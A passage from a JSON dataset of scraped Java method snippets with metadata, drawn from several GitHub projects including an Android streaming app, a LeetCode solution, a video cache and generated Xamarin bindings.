"BaseAbstractService", "params": ["OnAsyncTaskLoadCompletes"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setFinalVideoLinkCallback(OnAsyncTaskLoadCompletes callback) {\n        mVideoLinkCallback = callback;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58471, "method_name": "runFinalVideoLinkCallback", "class_name": "BaseAbstractService", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runFinalVideoLinkCallback(Object t) {\n        if (mVideoLinkCallback == null) return;\n        new Handler(Looper.getMainLooper()).post(() -> mVideoLinkCallback.onAsyncTaskLoadCompletes(t));\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58472, "method_name": "runFinishedCallback", "class_name": "BaseAbstractService", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runFinishedCallback(Object t) {\n        if (mFinishedCallback == null) return;\n        new Handler(Looper.getMainLooper()).post(() -> mFinishedCallback.onAsyncTaskLoadCompletes(t));\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58473, "method_name": "getHtmlFromUrl", "class_name": "BaseAbstractService", "params": ["String", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "Observable<String>", "snippet": "    protected Observable<String> getHtmlFromUrl(String url,boolean useMainThred) {\n        if (!useMainThred)\n            return generalService.getHtml(url)\n                    .subscribeOn(Schedulers.io())\n                    .map(mapResponseBodyToString);\n\n        else\n            return generalService.getHtml(url)\n                    .subscribeOn(Schedulers.io())\n                    .observeOn(AndroidSchedulers.mainThread())\n                    .map(mapResponseBodyToString);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58474, "method_name": "getJsonObjectFromUrl", "class_name": "BaseAbstractService", "params": ["String", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "Observable<JsonObject>", "snippet": "    protected Observable<JsonObject> getJsonObjectFromUrl(String url, boolean useMainThred) {\n        if (!useMainThred)\n            return generalService.getJsonObject(url)\n                    .subscribeOn(Schedulers.io())\n                    .map(mapResponseJsonObject);\n        else\n            return generalService.getJsonObject(url)\n                    .subscribeOn(Schedulers.io())\n                    .observeOn(AndroidSchedulers.mainThread())\n                    .map(mapResponseJsonObject);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58475, "method_name": "getJsonArrayFromUrl", "class_name": "BaseAbstractService", "params": ["String", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "Observable<JsonArray>", "snippet": "    protected Observable<JsonArray> getJsonArrayFromUrl(String url, boolean useMainThred) {\n        if (!useMainThred)\n            return generalService.getJsonArray(url)\n                    .subscribeOn(Schedulers.io())\n                    .map(mapResponseJsonArray);\n        else\n            return generalService.getJsonArray(url)\n                    .subscribeOn(Schedulers.io())\n                    .observeOn(AndroidSchedulers.mainThread())\n                    .map(mapResponseJsonArray);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58476, "method_name": "getFinalFromM3u8", "class_name": "BaseAbstractService", "params": ["String", "String"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "ObservableSource<String>", "snippet": "    protected ObservableSource<String> getFinalFromM3u8(String t2,String defaultUrl) throws IOException {\n        if (t2.isEmpty()) return Observable.just(defaultUrl);\n        String videoQualityHtml = t2;\n        String videoUrl = getFinalUrl();\n        if (defaultUrl != null && !defaultUrl.isEmpty()) videoUrl = defaultUrl;\n        videoUrl = Utils.getStreamQualityLink(videoQualityHtml,videoUrl);\n        return Observable.just(videoUrl);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58477, "method_name": "handleError", "class_name": "BaseAbstractService", "params": ["Throwable"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handleError(Throwable e) {\n        try {\n            if (e instanceof UndeliverableException) {\n\n            } else {\n                stopSpinner(fragmentActivity);\n                String msg = \"Source not working try again or check your internet connection\";\n                msg = e.getMessage();\n                int duration = 10;\n                AppCommon.showCenterToast(msg,duration);\n                e.printStackTrace();\n                Log.i(\"RXJAVA_DEBUG\",\"ERROR = \" + e.getMessage());\n            }\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseAbstractService.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58478, "method_name": "rob", "class_name": "HouseRobber", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int rob(int[] arr) {\n        if(arr.length == 0) {\n            return 0;\n        } else if(arr.length == 1) {\n            return arr[0];\n        } else if(arr.length == 2) {\n            return Math.max(arr[0], arr[1]);\n        }\n\n        int[] dp = new int[arr.length];\n        dp[0] = arr[0];\n        dp[1] = Math.max(arr[0], arr[1]);\n\n        for(int i = 2; i < dp.length; i ++) {\n            dp[i] = Math.max(dp[i - 2] + arr[i], dp[i - 1]);\n        }\n\n        return dp[dp.length - 1];\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/HouseRobber.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58479, "method_name": "showDisableStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showDisableStatus() {\n        setEnabled(false);\n        setBackgroundResource(R.drawable.shape_button_background_disable);\n        setTextColor(ContextCompat.getColor(getContext(), R.color.text_color_disable));\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 58480, "method_name": "showCloseStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showCloseStatus() {\n        setEnabled(true);\n        setBackgroundResource(R.drawable.shape_button_background_disable);\n        setTextColor(ContextCompat.getColor(getContext(), R.color.button_background));\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 58481, "method_name": "showOpenStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showOpenStatus() {\n        setEnabled(true);\n        setBackgroundResource(R.drawable.shape_button_background_enable);\n        setTextColor(Color.WHITE);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 58482, "method_name": "displayOrder", "class_name": "GNNRankingNotification", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String displayOrder() { return GNN_NOTIFY; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNRankingNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 58483, "method_name": "notifyPlayer", "class_name": "GNNRankingNotification", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifyPlayer() {\n        RotPUI.instance().selectGNNPanel(type, eventId, empires);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNRankingNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 58484, "method_name": "pack", "class_name": "AttachExecutableEvent", "params": ["Emulator<?>"], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] pack(Emulator<?> emulator) {\n        ByteBuffer buffer = ByteBuffer.allocate(0x100);\n        buffer.put(Utils.pack_dd(0x1));\n        buffer.put(Utils.pack_dd(0x400));\n        buffer.put(Utils.pack_dd(emulator.getPid()));\n        buffer.put(Utils.pack_dd(emulator.getPid()));\n        UnicornPointer pc = emulator.getContext().getPCPointer();\n        if (emulator.is32Bit()) {\n            buffer.put(Utils.pack_dq(pc.toUIntPeer() + 1));\n        } else {\n            buffer.put(Utils.pack_dq(pc.peer + 1));\n        }\n        buffer.put((byte) 1);\n        Utils.writeCString(buffer, DebugServer.DEBUG_EXEC_NAME);\n        buffer.put(Utils.pack_dq(1)); // base\n        buffer.put(Utils.pack_dq(emulator.getPageAlign() + 1));\n        buffer.put(Utils.pack_dq(1)); // base\n        return Utils.flipBuffer(buffer);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/ida/event/AttachExecutableEvent.java", "stars": "16", "class_props": {"extends": "DebuggerEvent", "implements": null, "modifiers": ["public"]}}, {"id": 58485, "method_name": "contextLoads", "class_name": "SecurityJwtApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void contextLoads() {\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/test/java/com/yyj/security/SecurityJwtApplicationTests.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58486, "method_name": "onSuggestionClick", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSuggestionClick (int p0)\n\t{\n\t\treturn n_onSuggestionClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58487, "method_name": "n_onSuggestionClick", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSuggestionClick (int p0);\n\n\n\tpublic boolean onSuggestionSelect (int p0)\n\t{\n\t\treturn n_onSuggestionSelect (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58488, "method_name": "onSuggestionSelect", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSuggestionSelect (int p0)\n\t{\n\t\treturn n_onSuggestionSelect (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58489, "method_name": "n_onSuggestionSelect", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSuggestionSelect (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58490, "method_name": "monodroidAddReference", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58491, "method_name": "monodroidClearReferences", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58492, "method_name": "read", "class_name": "ByteArrayCache", "params": ["byte", "long", "int"], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int read(byte[] buffer, long offset, int length) throws ProxyCacheException {\n        if (offset >= data.length) {\n            return -1;\n        }\n        if (offset > Integer.MAX_VALUE) {\n            throw new IllegalArgumentException(\"Too long offset for memory cache \" + offset);\n        }\n        return new ByteArrayInputStream(data).read(buffer, (int) offset, length);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58493, "method_name": "available", "class_name": "ByteArrayCache", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "long", "snippet": "    public long available() throws ProxyCacheException {\n        return data.length;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58494, "method_name": "append", "class_name": "ByteArrayCache", "params": ["byte", "int"], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void append(byte[] newData, int length) throws ProxyCacheException {\n        Preconditions.checkNotNull(data);\n        Preconditions.checkArgument(length >= 0 && length <= newData.length);\n\n        byte[] appendedData = Arrays.copyOf(data, data.length + length);\n        System.arraycopy(newData, 0, appendedData, data.length, length);\n        data = appendedData;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58495, "method_name": "close", "class_name": "ByteArrayCache", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws ProxyCacheException {\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58496, "method_name": "complete", "class_name": "ByteArrayCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void complete() {\n        completed = true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58497, "method_name": "isCompleted", "class_name": "ByteArrayCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCompleted() {\n        return completed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 58498, "method_name": "getAccount", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getAccount()\n\t{\n\t\treturn account;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58499, "method_name": "setAccount", "class_name": "ContractBalanceGeneral", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAccount( BigDecimal account )\n\t{\n\t\tthis.account = account;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58500, "method_name": "getCharge", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getCharge()\n\t{\n\t\treturn charge;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58501, "method_name": "setCharge", "class_name": "ContractBalanceGeneral", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCharge( BigDecimal charge )\n\t{\n\t\tthis.charge = charge;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58502, "method_name": "getInputBalance", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getInputBalance()\n\t{\n\t\treturn inputBalance;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58503, "method_name": "setInputBalance", "class_name": "ContractBalanceGeneral", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setInputBalance( BigDecimal inputBalance )\n\t{\n\t\tthis.inputBalance = inputBalance;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58504, "method_name": "getMonth", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getMonth()\n\t{\n\t\treturn month;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58505, "method_name": "setMonth", "class_name": "ContractBalanceGeneral", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMonth( String month )\n\t{\n\t\tthis.month = month;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58506, "method_name": "getOutputBalance", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getOutputBalance()\n\t{\n\t\treturn outputBalance;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58507, "method_name": "setOutputBalance", "class_name": "ContractBalanceGeneral", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOutputBalance( BigDecimal outputBalance )\n\t{\n\t\tthis.outputBalance = outputBalance;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58508, "method_name": "getPayment", "class_name": "ContractBalanceGeneral", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getPayment()\n\t{\n\t\treturn payment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58509, "method_name": "setPayment", "class_name": "ContractBalanceGeneral", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPayment( BigDecimal payment )\n\t{\n\t\tthis.payment = payment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/balance/ContractBalanceGeneral.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58510, "method_name": "isStateful", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isStateful ()\n\t{\n\t\treturn n_isStateful ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58511, "method_name": "n_isStateful", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_isStateful ();\n\n\n\tpublic int getOpacity ()\n\t{\n\t\treturn n_getOpacity ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58512, "method_name": "getOpacity", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getOpacity ()\n\t{\n\t\treturn n_getOpacity ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58513, "method_name": "n_getOpacity", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_getOpacity ();\n\n\n\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58514, "method_name": "draw", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58515, "method_name": "n_draw", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\n\n\n\tpublic void setAlpha (int p0)\n\t{\n\t\tn_setAlpha (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58516, "method_name": "setAlpha", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAlpha (int p0)\n\t{\n\t\tn_setAlpha (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58517, "method_name": "n_setAlpha", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setAlpha (int p0);\n\n\n\tpublic void setColorFilter (android.graphics.ColorFilter p0)\n\t{\n\t\tn_setColorFilter (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58518, "method_name": "setColorFilter", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setColorFilter (android.graphics.ColorFilter p0)\n\t{\n\t\tn_setColorFilter (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58519, "method_name": "n_setColorFilter", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setColorFilter (android.graphics.ColorFilter p0);\n\n\n\tpublic boolean onStateChange (int[] p0)\n\t{\n\t\treturn n_onStateChange (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58520, "method_name": "onStateChange", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onStateChange (int[] p0)\n\t{\n\t\treturn n_onStateChange (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58521, "method_name": "n_onStateChange", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onStateChange (int[] p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": 